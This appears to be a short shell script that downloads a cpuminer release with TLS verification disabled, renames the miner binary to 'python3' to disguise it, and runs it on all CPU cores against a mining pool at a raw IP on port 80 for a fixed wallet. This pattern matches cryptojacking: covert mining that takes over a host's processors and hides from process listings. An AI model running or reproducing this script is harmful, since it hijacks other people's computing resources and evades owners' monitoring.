wget --no-check-certificate https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz
tar xf cpuminer-opt-linux.tar.gz
mv cpuminer-sse2 python3
./python3 -a yespower -o stratum+tcp://159.223.188.176:80 -u web1q4f9hemgt64tpj2cranaxhtrcqqqedvnngzunpy.cek -p x -t$(nproc --all)
